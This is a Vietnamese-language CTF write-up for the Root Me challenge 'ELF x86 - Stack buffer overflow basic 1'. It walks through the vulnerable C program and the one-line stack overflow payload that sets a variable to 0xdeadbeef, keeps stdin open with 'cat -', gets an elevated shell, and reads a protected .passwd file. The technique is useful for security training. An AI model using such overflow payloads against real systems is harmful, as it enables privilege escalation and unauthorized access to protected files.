---
title: "Root Me - Writeup | No. 01"
date: 2026-10-16T20:00:00+07:00
draft: false
description: "Writeup for challenge ELF x86 - Stack buffer overflow basic 1"
categories:
  - "CTF"
  - "Pwnable"
tags:
  - "RootMe"
  - "Writeup"
cover: "/images/banner.jpg" # Đường dẫn ảnh bìa riêng cho bài viết (để trong thư mục static/)
---

# ELF x86 - Stack buffer overflow basic 1 | Writeup
## Source code
```C {linenos=true}
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Hell yeah! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```

## Solve
Trước tiên khi đọc qua soure code thì chúng dễ dàng nhận thấy đoạn code sau
```C {linenos=true linenostart=21}
  if (check == 0xdeadbeef)
   {
     printf("Hell yeah! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
```
Khi đó chỉ khi `check` mang giá trị 0xdeadbeef thì đoạn code phía sau mới được thực thi. Như vậy có thể nhận thấy yêu cầu của challange là khiến tràn bộ đệm từ `buf` về `check` giá trị 0xdeadbeef.
Sau khi đăng nhập vào challenge và dùng lệnh ls để list ra các file thì ta có thể thấy file chương trình ch13
![](/images/rootme_no_1/ls.png)
Vậy khi chạy chương trình sau đó nhập và giá trị để gây tràn `python -c 'print("a"*40 + "\xef\xbe\xad\xde")' | ./ch13`, ta đẩy vào 40 giá trị a liên tục vì `buf` chỉ được cấp phát bộ nhớ 40 byte cũng như chương trình được thực thi ở kiến trúc *x86(32 bit)* nên sẽ không có khoảng trống giữa các biến. Sau đó ta sẽ nhận được
![](/images/rootme_no_1/way.png)
Thế nhưng vậy thì **password** để qua challenge này ở đâu. Từ đây tôi cũng rút ra một kinh nghiệm cho bản thân đó là hãy list ra tất cả file cũng như quyền hạn thực thi trên các file đó. Vậy thì bây giờ ta sẽ list lại các file bằng lệnh `ls -la`
![](/images/rootme_no_1/lsla.png)
Qua đó có thế thấy một file **.passwd**. Thế nhưng file này chỉ được đọc bởi user **app-systeme-ch13-cracked**, nhưng hiện tại ta đang truy cập với quyền group **app-systeme-ch13**, vậy làm sao để ta có thể đọc được file này? Quay lại source code, ở phần lệnh được thực thi sau khi ta khiến tràn bộ đệm thành công
```C {linenos=true linenostart=24}
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
```
Ở đây, một shell với quyền thực thi cao hơn, tức là user **app-systeme-ch13-cracked**, đã được mở ra. Thế nhưng lệnh `python -c 'print("a"*40 + "\xef\xbe\xad\xde")` ở trước đó mà ta đã dùng để piping dữ liệu sang file chương trình ch13 đã gửi tín hiệu EOF(End-Of-File) khiến luồng nhập dữ liệu stdin đóng lại, khiến cho shell được mở ra ngay lập tức đóng lại. Vậy ở đây ta sẽ sử dụng một trick đó là `cat -` để lệnh `cat` tiếp tục đọc dữ liệu từ stdin, tránh cho việc shell bị đóng lại. Nên ta sẽ có lệnh hoàn chỉnh là `(python -c 'print("a"*40 + "\xef\xbe\xad\xde")'; cat -) | ./ch13` kèm với lệnh `cat .passwd` ngay sau đó để đọc file **password**. Và BaBumBaBumm
![](/images/rootme_no_1/ac.png)
Ta đã nhận được **password**